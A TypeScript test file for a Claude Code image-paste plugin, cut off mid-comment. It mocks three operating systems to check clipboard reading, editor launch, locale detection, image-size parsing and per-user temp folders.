import { expect, mock, test } from 'claude-code/testing'
import type { Engine } from 'claude-code/testing'
import type { On } from 'claude-code'

import { clipboardSteps, editorArgv, editsRoot, engineRoot, isMissing, isNewer, join, LANGUAGE_PS, langOf, localeOf, osOf, sizeOf, sweepStep, thumbOf } from './platform'
import type { Lang, Os } from './platform'

// The paste on each system, end to end inside the engine: "[Image #1]" lands in the box,
// the mod finds Claude Code's copy where that system keeps it, draws it above the prompt,
// opens the editor that system has (on macOS the panel kept warm, which takes each
// picture as a request file), and at Enter points Claude at the edit. Beneath the
// mod every command and file answers as that system would; test/e2e.mjs runs the same
// commands for real on each.

const SESSION = 'abcdef12-3456-7890-abcd-ef1234567890'

// A PNG's first 33 bytes, enough for its size, as $.fs.read hands bytes over.
const pngBytes = (width: number, height: number) => {
  const bytes = new Uint8Array(33)
  bytes.set([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13, 0x49, 0x48, 0x44, 0x52])
  new DataView(bytes.buffer).setUint32(16, width)
  new DataView(bytes.buffer).setUint32(20, height)
  return bytes
}
const base64 = (bytes: Uint8Array) => btoa(String.fromCharCode(...bytes))

type Answer = { exitCode: number; stdout?: string }
type System = {
  os: Os
  env: Record<string, string>
  // Claude Code's temp folder for this user, as the mod should work it out, and the
  // edits folder it should write to.
  engineRoot: string
  edits: string
  editor: (root: string, file: string, out: string) => string[]
  // The panel kept warm for the session, where the system has one.
  warm?: (root: string) => string[]
}

const SYSTEMS: Record<Os, System> = {
  mac: {
    os: 'mac',
    // TMPDIR set to the shared /tmp, as a person may: the mod asks macOS for the user's own.
    env: { TERM_PROGRAM: 'ghostty', TMPDIR: '/tmp/' },
    engineRoot: '/private/tmp/claude-501',
    edits: '/var/folders/xy/T/paste-preview/abcdef12',
    editor: (root, file, out) => ['/var/folders/xy/T/paste-preview/bin/panel', `${root}/editor/editor.html`, file, out, 'Image #1', 'zh-Hant'],
    warm: root => ['/var/folders/xy/T/paste-preview/bin/panel', 'serve', `${root}/editor/editor.html`, '/var/folders/xy/T/paste-preview/abcdef12/requests', 'zh-Hant'],
  },
  linux: {
    os: 'linux',
    env: { LANG: 'en_US.UTF-8', DISPLAY: ':0' },
    engineRoot: '/tmp/claude-501',
    edits: '/tmp/paste-preview-501/abcdef12',
    editor: (root, file, out) => ['node', `${root}/editor/server.mjs`, file, out, 'Image #1', '', 'en'],
  },
  windows: {
    os: 'windows',
    env: { OS: 'Windows_NT', TEMP: 'C:\\Users\\me\\AppData\\Local\\Temp', SystemRoot: 'C:\\Windows', TERM_PROGRAM: 'vscode' },
    engineRoot: 'C:\\Users\\me\\AppData\\Local\\Temp\\claude',
    edits: 'C:\\Users\\me\\AppData\\Local\\Temp\\paste-preview\\abcdef12',
    editor: (root, file, out) => ['node.exe', `${root}\\editor\\server.mjs`, file, out, 'Image #1', 'vscode', 'zh-Hant'],
  },
}

type World = {
  runs: string[][]
  fetches: string[]
  stored: Map<string, unknown>
  runTimeouts: (number | undefined)[]
  // Commands and file writes, in the order the mod made them.
  acts: string[]
  runEnvs: Record<string, string>[]
  spawns: string[][]
  toasts: string[]
  files: Map<string, { path: string; size: number; bytes?: Uint8Array; text?: string }>
  dirs: Map<string, { path: string; names: string[] }>
  context: readonly string[]
}

// A path as the files below are keyed: the engine resolves what the mod names against
// the machine the test runs on (C:\x is relative on macOS, /tmp is on a drive on
// Windows), so both sides are read with the drive and the slashes set aside.
const canon = (path: string) => path.replace(/\\/g, '/').replace(/^.*?([A-Za-z]:\/)/, '$1').replace(/^[A-Za-z]:/, '')

// The system beneath the mod: its variables, its commands and its files. `copy` is where
// Claude Code kept the paste (absent: it kept none); `say` what the editor prints.
const world = (on: On, system: System, options: { copy?: boolean; say?: string; tools?: Record<string, Answer>; pasteSize?: number; spawnFails?: boolean; warmFails?: boolean; culture?: string; session?: () => string; hold?: Promise<void>; says?: string[]; holdSweep?: Promise<void>; fails?: string[]; version?: string; latest?: string; stored?: Record<string, unknown>; foreignRoot?: boolean; foreignOld?: boolean } = {}) => {
  const w: World = { runs: [], fetches: [], stored: new Map(Object.entries(options.stored ?? {})), runTimeouts: [], acts: [], runEnvs: [], spawns: [], toasts: [], files: new Map(), dirs: new Map(), context: [] }
  const file = (path: string, size: number, bytes?: Uint8Array, text?: string) => w.files.set(canon(path), { path, size, bytes, text })
  // The warm panel's requests, as the mod writes them, for the panel below to take.
  const requests: { id: string; text: string }[] = []
  let wake = () => {}
  const dir = (path: string, names: string[]) => w.dirs.set(canon(path), { path, names })
  const sep = system.os === 'windows' ? '\\' : '/'
  const project = `${system.engineRoot}${sep}-home-me-project`
  const images = `${project}${sep}${SESSION}${sep}images`
  const pasted = `${images}${sep}1.png`
  dir(system.engineRoot, ['-home-me-project'])
  if (options.copy !== false) {
    dir(images, ['1.png'])
    file(pasted, options.pasteSize ?? 120_000, pngBytes(1600, 900))
  }
  mock.env(on, system.env)
  // The conversation the process is in now: /clear and /resume change it under the mod.
  on('session.id', () => ({ value: options.session?.() ?? SESSION }))
  on('ui.toast', ($, e) => {
    w.toasts.push(e.text)
    return { value: undefined }
  })
  on('process.run', async ($, e) => {
    const argv = [...e.argv]
    w.runs.push(argv)
    w.acts.push(`run ${argv.join(' ')}`)
    w.runEnvs.push({ ...e.init?.env })
    w.runTimeouts.push(e.init?.timeoutMs)
    const line = argv.join(' ')
    if (options.fails?.includes(line)) return { deny: `ENOENT: ${argv[0]}` }
    if (line === 'touch' || argv[0] === 'touch') return { value: { exitCode: 0, stdout: '', stderr: '', isStdoutTruncated: false, isStderrTruncated: false } }
    // Whether the working folder is the user's own: find prints it where it is. Another
    // account's (`foreignRoot`) prints nothing, and a folder of its own is made instead.
    // The folder 0.2 kept its edits in on macOS: whose it is.
    if (argv[0] === 'find' && argv.includes('-user') && !argv.includes('-perm')) return { value: { exitCode: 0, stdout: options.foreignOld ? '' : `${argv[1]}\n`, stderr: '', isStdoutTruncated: false, isStderrTruncated: false } }
    if (argv[0] === 'find' && argv.includes('-perm')) return { value: { exitCode: 0, stdout: options.foreignRoot ? '' : `${argv[1]}\n`, stderr: '', isStdoutTruncated: false, isStderrTruncated: false } }
    if (argv[0] === 'mktemp') return { value: { exitCode: 0, stdout: `${(argv.at(-1) ?? '').replace(/X+$/, 'Ab12Cd')}\n`, stderr: '', isStdoutTruncated: false, isStderrTruncated: false } }
    // The week-old sweep, answered when the test lets it be.
    if ((argv.includes('-mtime') || argv.some(a => a.includes('Get-ChildItem'))) && options.holdSweep !== undefined) {
      await options.holdSweep
      w.acts.push('swept')
    }
    const told = Object.entries(options.tools ?? {}).find(([command]) => line.includes(command))?.[1]
    if (told !== undefined) {
      // A clipboard tool that worked leaves the picture where it was told to.
      const out = argv.at(-1) ?? ''
      const target = e.init?.env?.PASTE_PREVIEW_OUT ?? out
      if (told.exitCode === 0 && /paste\.png$/.test(target)) file(target, 50_000, pngBytes(800, 600))
      return { value: { exitCode: told.exitCode, stdout: told.stdout ?? '', stderr: '', isStdoutTruncated: false, isStderrTruncated: false } }
    }
    const stdout = line === 'uname -s' ? (system.os === 'mac' ? 'Darwin' : 'Linux') : line === 'id -u' ? '501' : line === 'getconf DARWIN_USER_TEMP_DIR' ? '/var/folders/xy/T/\n' : line.startsWith('defaults read') ? '(\n    "zh-Hant-TW",\n    en\n)' : line.includes(LANGUAGE_PS) ? (options.culture ?? 'zh-TW') : line.startsWith('sips -g') ? 'pixelWidth: 1600\n  pixelHeight: 900' : ''
    if (line.startsWith('sips -s')) file(argv.at(-1) ?? '', 9000, pngBytes(480, 270))
    return { value: { exitCode: 0, stdout, stderr: '', isStdoutTruncated: false, isStderrTruncated: false } }
  })
  on('process.spawn', async function* ($, e) {
    w.spawns.push([...e.argv])
    if (options.spawnFails) return { deny: 'ENOENT: no such file or directory' }
    // Each editor in turn answers the next of `says`, once the test lets it.
    const word = e.argv[1] === 'serve' ? (options.say ?? 'SAVED') : (options.says?.[w.spawns.filter(a => a[1] !== 'serve').length - 1] ?? options.say ?? 'SAVED')
    if (e.argv[1] !== 'serve') await options.hold
    // The warm panel: each request answered by a line naming it.
    if (e.argv[1] === 'serve') {
      if (options.warmFails) return { deny: 'the panel quit' }
      for (;;) {
        while (requests.length === 0) await new Promise<void>(resolve => (wake = resolve))
        const { id, text } = requests.shift()!
        const { out } = JSON.parse(text) as { out: string }
        if (word === 'SAVED') file(out, 400_000, pngBytes(1600, 900))
        yield { stream: 'stdout' as const, text: `${word} ${id}\n` }
      }
    }
    // The editor writes the edit, and in the browser its small copy beside it.
    const out = e.argv[3] ?? ''
    if (word === 'SAVED') {
      file(out, 400_000, pngBytes(1600, 900))
      if (system.os !== 'mac') file(thumbOf(out), 30_000, pngBytes(480, 270))
    }
    yield { stream: 'stdout' as const, text: `${word}\n` }
    return { value: { code: 0, signal: null } }
  })
  // A real path answers as the mod spelled it.
  on('fs.stat', ($, e) => {
    const found = w.files.get(canon(e.path)) ?? w.dirs.get(canon(e.path))
    if (found === undefined) return { deny: `ENOENT: ${e.path}` }
    const size = 'size' in found ? found.size : 0
    return { value: { kind: 'size' in found ? ('file' as const) : ('dir' as const), size, mtimeMs: 1, isLink: false, ...(e.resolve ? { realPath: found.path } : {}) } }
  })
  on('fs.read', ($, e) => {
    // The mod's own manifest, for its version.
    if (canon(e.path).endsWith('/.claude-plugin/plugin.json')) return { value: JSON.stringify({ name: 'paste-preview', version: options.version ?? '0.3.0' }) }
    const bytes = w.files.get(canon(e.path))?.bytes
    return bytes === undefined ? { deny: `ENOENT: ${e.path}` } : { value: { base64: base64(bytes) } }
  })
  on('fs.list', ($, e) => ({ value: (w.dirs.get(canon(e.path))?.names ?? []).map(name => ({ name, kind: name.includes('.') ? ('file' as const) : ('dir' as const), size: 0, mtimeMs: 0, isLink: false })) }))
  on('fs.exists', ($, e) => ({ value: w.dirs.has(canon(e.path)) || w.files.has(canon(e.path)) }))
  on('fs.write', ($, e) => {
    w.acts.push(`write ${e.path}`)
    file(e.path, e.text.length, undefined, e.text)
    const request = /[\\/]requests[\\/]([^\\/]+)\.json$/.exec(e.path)
    if (request !== null) {
      requests.push({ id: request[1] ?? '', text: e.text })
      wake()
    }
    return { value: undefined }
  })
  // What reaches Claude at Enter: the notes beside the prompt. (Which block is left out
  // is the same on every system: register.test.tsx holds it.)
  on('prompt.submit', ($, e) => {
    w.context = e.context ?? []
    return { text: e.text, context: e.context }
  })

  // The prompt box, which the mod reads twice a second from the session's start.
  const box = { text: '' }
  on('prompt.read', () => ({ value: { text: box.text, cursor: box.text.length } }))
  on('prompt.edit', ($, e) => {
    box.text = e.text.slice(0, e.start) + e.inputText + e.text.slice(e.end)
    return { text: box.text, cursor: e.start + e.inputText.length }
  })
  on('session.start', ($, e) => ({ cwd: e.cwd }))
  on('session.end', ($, e) => ({ sessionId: e.sessionId }))
  // GitHub's copy of the manifest (`latest` its version, 'down' no answer), and the store
  // that outlives the session.
  on('http.fetch', ($, e) => {
    w.fetches.push(e.url)
    if (options.latest === undefined || options.latest === 'down') return { deny: 'getaddrinfo ENOTFOUND' }
    if (options.latest === '404') return { value: { status: 404, ok: false, headers: {}, text: '404: Not Found' } }
    return { value: { status: 200, ok: true, headers: {}, text: options.latest.startsWith('{') ? options.latest : JSON.stringify({ name: 'paste-preview', version: options.latest }) } }
  })
  on('store.get', ($, e) => ({ value: w.stored.get(e.key) }))
  on('store.set', ($, e) => {
    w.stored.set(e.key, e.value)
    return { value: undefined }
  })
  return { w, pasted, box, dir, file, project, sep }
}

// The mod reads the box on a timer, which a test can drive: the session starts, then
// "[Image #1]" is in the box.
const paste = async ($: Engine, box: { text: string }) => {
  await $.session.start({ cwd: '/home/me/project', surface: 'terminal', isInteractive: true })
  box.text = '[Image #1] '
}

// Text put in the box as the person's editor puts it there (a key, a paste): the edit
// raised as the engine raises it. Its typings list only the prompt events a test usually
// raises; the kit raises this one too, on every Claude Code the mod supports.
const typeIn = ($: Engine, box: { text: string }, inputText: string) => {
  const raise = $.prompt as unknown as { edit: (e: { origin: { kind: 'composer' }; text: string; cursor: number; start: number; end: number; inputText: string }) => Promise<unknown> }
  const at = box.text.length
  return raise.edit({ origin: { kind: 'composer' }, text: box.text, cursor: at, start: at, end: at, inputText })
}

// Lets the work the paste started run on: waits on the mocked clock, then the event loop.
const until = async (clock: { advance: (ms: number) => Promise<void> }, isDone: () => boolean) => {
  for (let i = 0; i < 40 && !isDone(); i++) await clock.advance(250)
}

const BAND = {
  plugin: 'paste-preview',
  component: 'AbovePrompt',
  surface: 'terminal',
  props: { hasSurvey: false, isCollapsed: false, isWorking: false, maxRows: 20, bodyColumns: 100, scroll: { offset: 0, bodyRows: 19 }, view: {} },
  viewport: { columns: 105, rows: 46, isFullscreen: true },
} as const

for (const os of ['mac', 'linux', 'windows'] as const) {
  test(`${os}: a paste opens that system's editor and Enter sends the edit`, async ($, on) => {
    const system = SYSTEMS[os]
    const clock = mock.clock(on)
    const { w, pasted, box } = world(on, system)
    await paste($, box)
    await until(clock, () => w.spawns.length > 0)
    const sep = os === 'windows' ? '\\' : '/'
    const out = `${system.edits}${sep}1.png`
    const root = w.spawns[0]?.find(a => /[\\/]editor[\\/](editor\.html|server\.mjs)$/.test(a))?.replace(/[\\/]editor[\\/](editor\.html|server\.mjs)$/, '') ?? ''
    if (system.warm === undefined) expect(w.spawns[0]).toEqual(system.editor(root, pasted, out))
    else {
      // Warm from the session's start; the paste is a request it takes.
      expect(w.spawns[0]).toEqual(system.warm(root))
      await until(clock, () => [...w.files.values()].some(f => f.text?.includes(pasted)))
      const request = [...w.files.values()].find(f => /[\\/]requests[\\/][^\\/]+\.json$/.test(f.path))
      expect(JSON.parse(request?.text ?? '{}')).toEqual({ picture: pasted, out, label: 'Image #1' })
      expect(w.spawns).toHaveLength(1)
    }

    // Where the mod made its folder, and how it clears old ones.
    if (os === 'windows') expect(w.files.has(canon(`${system.edits}\\.keep`))).toBe(true)
    // Made for the user alone, on macOS as on Linux.
    else expect(w.runs).toContainEqual(['mkdir', '-p', '-m', '700', system.edits.replace(/\/abcdef12$/, ''), system.edits])
    const sweep = w.runs.find(argv => argv.includes('find') || argv.some(a => a.includes('Get-ChildItem')))
    expect(sweep?.[0]).toBe(os === 'windows' ? 'powershell.exe' : 'find')

    // The band shows the edit, labelled in the system's language.
    await until(clock, () => false)
    const band = await $.ui.mount({ ...BAND })
    const label = await band.find({ type: 'Text', text: /^Image #1/ })
    expect(label?.text).toBe(os === 'linux' ? 'Image #1 edited' : 'Image #1 已編輯')
    expect((await band.find({ type: 'Image' }))?.props).toMatchObject({ source: { png: base64(pngBytes(480, 270)) } })
    await band.unmount()

    // Enter: Claude is pointed at the edit.
    await $.prompt.submit({ text: '[Image #1] what is this?', wait: false, origin: { kind: 'composer' } })
    expect(w.context.some(note => note.includes(out))).toBe(true)
  })
}

test('linux: no copy kept and no clipboard tool installed says what to install, once', async ($, on) => {
  const clock = mock.clock(on)
  const { w, box } = world(on, SYSTEMS.linux, { copy: false, tools: { 'wl-paste': { exitCode: 127 }, xclip: { exitCode: 127 } } })
  await paste($, box)
  await until(clock, () => w.toasts.length > 0)
  expect(w.toasts).toEqual(['Could not read the clipboard: install wl-clipboard or xclip'])
  expect(w.spawns).toEqual([])
})

test('linux: no copy kept, the clipboard is read, Wayland first where it runs', async ($, on) => {
  const clock = mock.clock(on)
  const system = { ...SYSTEMS.linux, env: { ...SYSTEMS.linux.env, WAYLAND_DISPLAY: 'wayland-0' } }
  const { w, box } = world(on, system, { copy: false, tools: { 'wl-paste': { exitCode: 1 }, xclip: { exitCode: 0 } } })
  await paste($, box)
  await until(clock, () => w.spawns.length > 0)
  const tried = w.runs.filter(argv => argv[0] === 'sh').map(argv => argv[2]?.split(' ')[1])
  expect(tried).toEqual(['wl-paste', 'xclip'])
  expect(w.spawns[0]?.[2]).toBe('/tmp/paste-preview-501/abcdef12/1.paste.png')
  expect(w.toasts).toEqual([])
})

test('windows: no copy kept, the clipboard is read through PowerShell', async ($, on) => {
  const clock = mock.clock(on)
  const { w, box } = world(on, SYSTEMS.windows, { copy: false, tools: { 'Clipboard]::GetImage': { exitCode: 0 } } })
  await paste($, box)
  await until(clock, () => w.spawns.length > 0)
  const read = w.runs.findIndex(argv => argv.some(a => a.includes('GetImage')))
  expect(w.runs[read]?.slice(0, 4)).toEqual(['powershell.exe', '-NoProfile', '-NonInteractive', '-Sta'])
  expect(w.runEnvs[read]).toEqual({ PASTE_PREVIEW_OUT: 'C:\\Users\\me\\AppData\\Local\\Temp\\paste-preview\\abcdef12\\1.paste.png' })
  expect(w.spawns[0]?.[2]).toBe('C:\\Users\\me\\AppData\\Local\\Temp\\paste-preview\\abcdef12\\1.paste.png')
})

test('linux: a paste past 2 MiB is drawn from its file, not sent as bytes', async ($, on) => {
  const clock = mock.clock(on)
  const { w, pasted, box } = world(on, SYSTEMS.linux, { pasteSize: 3_000_000, say: 'CANCELLED' })
  await paste($, box)
  await until(clock, () => w.spawns.length > 0)
  await until(clock, () => false)
  const band = await $.ui.mount({ ...BAND })
  expect((await band.find({ type: 'Image' }))?.props).toMatchObject({ source: { file: pasted, format: 'png' }, columns: 28, rows: 8 })
  expect((await band.find({ type: 'Text', text: /^Image #1/ }))?.text).toBe('Image #1')
  await band.unmount()
})

test('linux: past what $.fs.read takes, the size comes from the first bytes', async ($, on) => {
  const clock = mock.clock(on)
  const { w, box } = world(on, SYSTEMS.linux, { pasteSize: 6_000_000, tools: { 'head -c': { exitCode: 0, stdout: base64(pngBytes(1600, 900)) } } })
  await paste($, box)
  await until(clock, () => w.spawns.length > 0)
  expect(w.runs.some(argv => argv[0] === 'sh' && argv[2]?.startsWith('head -c 65536'))).toBe(true)
  expect(w.spawns).toHaveLength(1)
})

test('without node, or without a browser, the editor says why it did not open', async ($, on) => {
  const clock = mock.clock(on)
  const { w, box } = world(on, SYSTEMS.linux, { spawnFails: true })
  await paste($, box)
  await until(clock, () => w.toasts.length > 0)
  expect(w.toasts).toEqual(['The editor did not open: node was not found'])
})

test('mac: a warm panel that will not start leaves each paste a panel of its own', async ($, on) => {
  const clock = mock.clock(on)
  const { w, pasted, box } = world(on, SYSTEMS.mac, { warmFails: true })
  await paste($, box)
  await until(clock, () => w.spawns.length > 1)
  const root = w.spawns[0]?.[2]?.replace(/\/editor\/editor\.html$/, '') ?? ''
  expect(w.spawns[1]).toEqual(SYSTEMS.mac.editor(root, pasted, `${SYSTEMS.mac.edits}/1.png`))
  // Not started again on every keystroke: once gone at the start, it stays gone.
  box.text = '[Image #1] and'
  await until(clock, () => false)
  expect(w.spawns.filter(argv => argv[1] === 'serve')).toHaveLength(1)
})

test('a browser that could not be opened is said', async ($, on) => {
  const clock = mock.clock(on)
  const { w, box } = world(on, SYSTEMS.windows, { say: 'UNOPENED' })
  await paste($, box)
  await until(clock, () => w.toasts.length > 0)
  expect(w.toasts).toEqual(['編輯器沒有打開：找不到瀏覽器'])
})

// ——— the tables themselves ———

test('each system is told apart: Windows by its path or OS, macOS by uname', async () => {
  expect(osOf('C:\\Users\\me\\.claude\\plugins\\paste-preview', undefined, '')).toBe('windows')
  expect(osOf('/home/me/.claude/plugins/paste-preview', 'Windows_NT', '')).toBe('windows')
  expect(osOf('/Users/me/.claude/plugins/paste-preview', undefined, 'Darwin\n')).toBe('mac')
  expect(osOf('/home/me/.claude/plugins/paste-preview', undefined, 'Linux')).toBe('linux')
})

test('Claude Code’s temp folder and the edits folder, per system', async () => {
  expect(engineRoot('mac', { TMPDIR: '/var/folders/x/T/' }, '501')).toBe('/tmp/claude-501')
  expect(engineRoot('mac', { CLAUDE_CODE_TMPDIR: '/Volumes/t/' }, '501')).toBe('/Volumes/t/claude-501')
  expect(engineRoot('linux', { TMPDIR: '/run/user/1000/' }, '1000')).toBe('/run/user/1000/claude-1000')
  expect(engineRoot('linux', {}, '1000')).toBe('/tmp/claude-1000')
  expect(engineRoot('windows', { TEMP: 'C:\\Users\\me\\AppData\\Local\\Temp\\' }, '')).toBe('C:\\Users\\me\\AppData\\Local\\Temp\\claude')
  expect(engineRoot('windows', { SystemRoot: 'C:\\Windows' }, '')).toBe('C:\\Windows\\temp\\claude')
  // macOS: the user's own temp folder, which no other account can write to. In /tmp,
  // shared by every account, another user could leave a folder and a panel binary there
  // before this one ran the mod, and the mod would run that binary.
  expect(editsRoot('mac', { TMPDIR: '/tmp' }, '501', '/var/folders/x/T/')).toBe('/var/folders/x/T/paste-preview')
  expect(editsRoot('mac', { TMPDIR: '/tmp', HOME: '/Users/me' }, '501')).toBe('/Users/me/Library/Caches/paste-preview')
  expect(editsRoot('mac', {}, '501')).toBe('/tmp/paste-preview-501')
  expect(editsRoot('linux', {}, '1000')).toBe('/tmp/paste-preview-1000')
  expect(editsRoot('windows', { TMP: 'D:\\t' }, '')).toBe('D:\\t\\paste-preview')
  expect(join('windows', 'C:\\', 'claude')).toBe('C:\\claude')
})

test('the clipboard commands, per system', async () => {
  expect(clipboardSteps('mac', '/o.png', {})).toEqual([{ argv: ['pngpaste', '/o.png'] }])
  expect(clipboardSteps('linux', '/o.png', {}).map(s => s.argv[2])).toEqual(['exec xclip -selection clipboard -t image/png -o > "$1"', 'exec wl-paste --no-newline --type image/png > "$1"'])
  expect(clipboardSteps('linux', '/o.png', { WAYLAND_DISPLAY: 'wayland-0' }).map(s => s.argv.at(-1))).toEqual(['/o.png', '/o.png'])
  const [windows] = clipboardSteps('windows', 'C:\\o.png', {})
  expect(windows?.argv[0]).toBe('powershell.exe')
  expect(windows?.argv.join(' ')).not.toContain('C:\\o.png')
  expect(windows?.env).toEqual({ PASTE_PREVIEW_OUT: 'C:\\o.png' })
  expect([isMissing(127), isMissing(undefined), isMissing(1), isMissing(0)]).toEqual([true, true, false, false])
  expect(sweepStep('windows', 'C:\\t').env).toEqual({ PASTE_PREVIEW_ROOT: 'C:\\t' })
})

test('the editor, per system: the panel only where Swift built it', async () => {
  const a = { root: '/r', panel: '/b/panel', file: '/f.png', out: '/o/1.png', label: 'Image #1', terminal: 'ghostty', lang: 'en' }
  expect(editorArgv('mac', a)).toEqual(['/b/panel', '/r/editor/editor.html', '/f.png', '/o/1.png', 'Image #1', 'en'])
  expect(editorArgv('mac', { ...a, panel: undefined })[0]).toBe('node')
  expect(editorArgv('linux', a)).toEqual(['node', '/r/editor/server.mjs', '/f.png', '/o/1.png', 'Image #1', 'ghostty', 'en'])
  expect(editorArgv('windows', { ...a, root: 'C:\\r' }).slice(0, 2)).toEqual(['node.exe', 'C:\\r\\editor\\server.mjs'])
  expect(thumbOf('C:\\t\\1.png')).toBe('C:\\t\\1.thumb.png')
})

test('the language, per system: every locale maps to one of five', async () => {
  // macOS: the first entry of AppleLanguages.
  const apple = (...tags: string[]) => `(\n${tags.map(t => (t.includes('-') ? `    "${t}"` : `    ${t}`)).join(',\n')}\n)`
  expect(langOf('mac', apple('zh-Hant-TW', 'en-US'))).toBe('zh-Hant')
  expect(langOf('mac', apple('zh-Hant-HK'))).toBe('zh-Hant')
  expect(langOf('mac', apple('zh-Hans-CN', 'zh-Hant-TW'))).toBe('zh-Hans')
  expect(langOf('mac', apple('zh-Hans-SG'))).toBe('zh-Hans')
  expect(langOf('mac', apple('ja-JP'))).toBe('ja')
  expect(langOf('mac', apple('ja'))).toBe('ja')
  expect(langOf('mac', apple('ko-KR', 'en'))).toBe('ko')
  expect(langOf('mac', apple('en', 'zh-Hant-TW'))).toBe('en')
  expect(langOf('mac', apple('fr-FR'))).toBe('en')
  expect(langOf('mac', '')).toBe('en')
  // Linux: LC_ALL, else LC_MESSAGES, else LANG.
  const linux = (env: Record<string, string>) => langOf('linux', localeOf(env))
  expect(linux({ LANG: 'zh_TW.UTF-8' })).toBe('zh-Hant')
  expect(linux({ LANG: 'zh_HK.UTF-8' })).toBe('zh-Hant')
  expect(linux({ LANG: 'zh_MO.UTF-8' })).toBe('zh-Hant')
  expect(linux({ LANG: 'zh_TW.Big5' })).toBe('zh-Hant')
  expect(linux({ LANG: 'zh_CN.UTF-8' })).toBe('zh-Hans')
  expect(linux({ LANG: 'zh_SG.GB2312' })).toBe('zh-Hans')
  expect(linux({ LANG: 'zh' })).toBe('zh-Hans')
  expect(linux({ LANG: 'ja_JP.UTF-8' })).toBe('ja')
  expect(linux({ LANG: 'ko_KR.EUC-KR' })).toBe('ko')
  expect(linux({ LANG: 'de_DE.UTF-8' })).toBe('en')
  expect(linux({ LANG: 'C.UTF-8' })).toBe('en')
  expect(linux({})).toBe('en')
  expect(linux({ LANG: 'zh_TW.UTF-8', LC_MESSAGES: 'ja_JP.UTF-8' })).toBe('ja')
  expect(linux({ LANG: 'en_US.UTF-8', LC_MESSAGES: 'ko_KR.UTF-8', LC_ALL: 'zh_CN.UTF-8' })).toBe('zh-Hans')
  // Windows: the UI culture's name.
  expect(langOf('windows', 'zh-TW\r\n')).toBe('zh-Hant')
  expect(langOf('windows', 'zh-HK')).toBe('zh-Hant')
  expect(langOf('windows', 'zh-MO')).toBe('zh-Hant')
  expect(langOf('windows', 'zh-Hant')).toBe('zh-Hant')
  expect(langOf('windows', 'zh-CN')).toBe('zh-Hans')
  expect(langOf('windows', 'zh-SG')).toBe('zh-Hans')
  expect(langOf('windows', 'zh-Hans')).toBe('zh-Hans')
  expect(langOf('windows', 'ja-JP')).toBe('ja')
  expect(langOf('windows', 'ko-KR')).toBe('ko')
  expect(langOf('windows', 'en-US')).toBe('en')
  expect(langOf('windows', '')).toBe('en')
})

// The band's words and the editor's ?lang= come from the same answer.
const EDITED: Record<Lang, string> = { en: 'Image #1 edited', 'zh-Hant': 'Image #1 已編輯', 'zh-Hans': 'Image #1 已编辑', ja: 'Image #1 編集済み', ko: 'Image #1 편집됨' }
const SPEAKERS: [Os, Record<string, string>, string | undefined, Lang][] = [
  ['linux', { LANG: 'zh_TW.UTF-8' }, undefined, 'zh-Hant'],
  ['linux', { LANG: 'zh_CN.UTF-8' }, undefined, 'zh-Hans'],
  ['linux', { LANG: 'ja_JP.UTF-8' }, undefined, 'ja'],
  ['linux', { LC_ALL: 'ko_KR.UTF-8', LANG: 'en_US.UTF-8' }, undefined, 'ko'],
  ['linux', { LANG: 'de_DE.UTF-8' }, undefined, 'en'],
  ['windows', { OS: 'Windows_NT', TEMP: 'C:\\T' }, 'en-US', 'en'],
  ['windows', { OS: 'Windows_NT', TEMP: 'C:\\T' }, 'zh-CN', 'zh-Hans'],
  ['windows', { OS: 'Windows_NT', TEMP: 'C:\\T' }, 'zh-HK', 'zh-Hant'],
  ['windows', { OS: 'Windows_NT', TEMP: 'C:\\T' }, 'ja-JP', 'ja'],
  ['windows', { OS: 'Windows_NT', TEMP: 'C:\\T' }, 'ko-KR', 'ko'],
]
for (const [os, env, culture, lang] of SPEAKERS) {
  test(`${os}: ${JSON.stringify(env)} ${culture ?? ''} speaks ${lang}`, async ($, on) => {
    const clock = mock.clock(on)
    const system = { ...SYSTEMS[os], env, edits: os === 'windows' ? 'C:\\T\\paste-preview\\abcdef12' : SYSTEMS[os].edits, engineRoot: os === 'windows' ? 'C:\\T\\claude' : SYSTEMS[os].engineRoot }
    const { w, box } = world(on, system, culture === undefined ? {} : { culture })
    await paste($, box)
    await until(clock, () => w.spawns.length > 0)
    expect(w.spawns[0]?.at(-1)).toBe(lang)
    await until(clock, () => false)
    const band = await $.ui.mount({ ...BAND })
    expect((await band.find({ type: 'Text', text: /^Image #1/ }))?.text).toBe(EDITED[lang])
    await band.unmount()
  })
}

test('a picture’s size from its first bytes', async () => {
  expect(sizeOf(pngBytes(1600, 900))).toEqual({ width: 1600, height: 900, isPng: true })
  const gif = new Uint8Array([0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x40, 0x01, 0xf0, 0x00])
  expect(sizeOf(gif)).toEqual({ width: 320, height: 240, isPng: false })
  // A JPEG: SOI, an APP0 of 16 bytes, then SOF0 at 1024×768.
  const jpeg = new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 0, 16, ...new Array(14).fill(0), 0xff, 0xc0, 0, 17, 8, 0x03, 0x00, 0x04, 0x00, 3])
  expect(sizeOf(jpeg)).toEqual({ width: 1024, height: 768, isPng: false })
  // WebP, lossless: 300×200.
  const webp = new Uint8Array(30)
  webp.set([0x52, 0x49, 0x46, 0x46, 0, 0, 0, 0, 0x57, 0x45, 0x42, 0x50, 0x56, 0x50, 0x38, 0x4c, 0, 0, 0, 0, 0x2f])
  const w = 300 - 1, h = 200 - 1
  webp.set([w & 0xff, ((w >> 8) & 0x3f) | ((h & 0x03) << 6), (h >> 2) & 0xff, (h >> 10) & 0x0f], 21)
  expect(sizeOf(webp)).toEqual({ width: 300, height: 200, isPng: false })
  expect(sizeOf(new Uint8Array([1, 2, 3]))).toBeUndefined()
})


// What each editor was asked to open, on any system: a command of its own (Linux,
// Windows, a Mac without the warm panel) or a request the warm panel takes (macOS).
const asked = (w: World) => [
  ...w.spawns.filter(argv => argv[1] !== 'serve').map(argv => ({ picture: argv[2] ?? '', out: argv[3] ?? '' })),
  ...[...w.files.values()].filter(f => /[\\/]requests[\\/][^\\/]+\.json$/.test(f.path)).map(f => {
    const { picture, out } = JSON.parse(f.text ?? '{}') as { picture: string; out: string }
    return { picture, out }
  }),
]
const OTHER = 'fedcba98-7654-3210-fedc-ba9876543210'
const deferred = () => {
  let release = () => {}
  const promise = new Promise<void>(resolve => (release = resolve))
  return { promise, release }
}

// /clear and /resume start another conversation in the same process, under another id
// and with no session.start (issue #6): the next paste is in that conversation's folder.
// Read from the old one's, the band waited three seconds and then fell back on the
// clipboard, which a Mac without pngpaste cannot read: no thumbnail, no Edit button.
// The mod is told of no change: whatever the engine raises around it, the conversation is
